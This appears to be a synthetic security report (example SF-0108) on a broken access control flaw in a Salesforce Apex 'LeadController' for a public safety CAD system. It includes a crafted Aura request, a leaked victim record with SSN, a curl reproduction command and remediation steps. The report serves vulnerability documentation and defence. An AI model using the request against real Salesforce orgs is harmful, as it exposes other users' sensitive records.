# Security Analysis Report
**System:** FirstResponse CAD Integration (Salesforce-Integrated)
**Domain:** Government / Public Safety
**Example ID:** SF-0108
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.1 | Functional pivot on `LeadController.getLeadData` — attacker uses Lead controller to read any public safety CAD Lead record belonging to other users |

---

## Finding 1 — BAC: Functional Pivot on Lead Object (Pattern 2.1)

### Summary
The Apex controller `LeadController` on FirstResponse CAD Integration (`96e67f99.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Lead object. Per §5.0 Pattern 2.1, the attacker performs a functional pivot — using a Lead controller not intended for cross-user access — to read any public safety CAD-associated Lead record including SSN and confidential operational notes.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getLeadDetails(String leadId, ...)` but the Aura descriptor in §6.0 is `c.LeadController.getLeadData`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.1 — Functional pivot (vertical/horizontal) (BAC)
**Affected controller:** `c.LeadController.getLeadData`
**Affected endpoint:** `POST https://96e67f99.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://96e67f99.lightning.force.com/aura
Authorization: Bearer 00D96E67F99!AR96e67f99...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D96E67F99!AR96e67f99...

message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN",
"params":{"leadId":"0017F99","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Lead Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "0017F99", "Name": "Victim Lead Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-93-4323"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D96E67F99!AR96e67f99..."
curl -s -X POST "https://96e67f99.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.LeadController.getLeadData","callingDescriptor":"UNKNOWN","params":{"leadId":"0017F99","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-93-4323
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class LeadController { ... }`
2. `WHERE Id = :leadId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
